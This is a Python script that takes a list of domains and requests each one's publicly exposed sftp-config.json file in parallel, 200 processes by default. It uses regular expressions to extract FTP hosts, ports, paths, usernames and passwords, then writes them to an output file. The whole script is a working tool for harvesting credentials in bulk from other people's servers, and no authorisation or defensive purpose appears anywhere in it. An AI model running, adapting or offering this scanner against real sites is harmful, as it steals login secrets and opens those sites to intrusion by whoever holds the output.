#!/usr/bin/python
import sys, os, argparse, urllib2,re
from urllib2 import Request
#from urllib.request import urlopen
from multiprocessing import Pool
from pprint import pprint

def extractftp(line):
	linesplit = line.split(",")
	domain = linesplit[0].strip()
    	
    	try:
		# TAKE A LOOK FOR FTP Configuration file
		# Try to download http://target.tld/sftp-config.json
		request = Request('http://' + domain + "/sftp-config.json")
		req = urllib2.urlopen(request)
		answer = req.read().decode()

		# Ensure it's the correct file and not just a random page
		if('save_before_upload' in answer):
		    line = 'http://' + domain + '/sftp-config.json, '
		    ftptype = re.search('"type".[^"]*"(.[^"]*)', answer)
		    if ftptype:
			line += ftptype.group(1)+', '
		    else:
			line += 'none, '
		    ftphost = re.search('"host".[^"]*"(.[^"]*)', answer)
		    if ftphost:
			line += ftphost.group(1)+', '
		    else:
			line += 'none, '
                    ftpport = re.search('"port".[^"]*"(.[^"]*)', answer)
		    if ftpport:
			line += ftpport.group(1)+', '
		    else:
			line += 'none, '
		    ftppath = re.search('"remote_path".[^"]*"(.[^"]*)', answer)
		    if ftppath:
			line += ftppath.group(1)+', '
		    else:
			line += 'none, '
		    ftpuser = re.search('"user".[^"]*"(.[^"]*)', answer)
		    if ftpuser:
			line += ftpuser.group(1)+', '
		    else:
			line += 'none, '
		    ftppassword = re.search('"password".[^"]*"(.[^"]*)', answer)
		    if ftppassword:
			line += ftppassword.group(1)+', '
		    else:
			line += 'none, '

		    print line

		    # Write match to OUTPUTFILE
		    fHandle = open(OUTPUTFILE,'a')
		    fHandle.write(line+"\n")
		    fHandle.close()
		    print("[*] Found config: " + domain)
		    return

	except Exception as e:     
		print e
        	print("[*] Nope: " + domain)
    

if __name__ == '__main__':

    # Parse arguments
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--inputfile', default='extract.txt', help='input file')
    parser.add_argument('-o', '--outputfile', default='output.txt', help='output file')
    parser.add_argument('-t', '--threads', default=200, help='threads')
    args = parser.parse_args()

    EXTRACTFILE=args.inputfile
    OUTPUTFILE=args.outputfile
    MAXPROCESSES=int(args.threads)

    print("Scanning...")
    pool = Pool(processes=MAXPROCESSES)
    extracts = open(EXTRACTFILE, "r").readlines()

    pool.map(extractftp, extracts)
    #print("Finished")
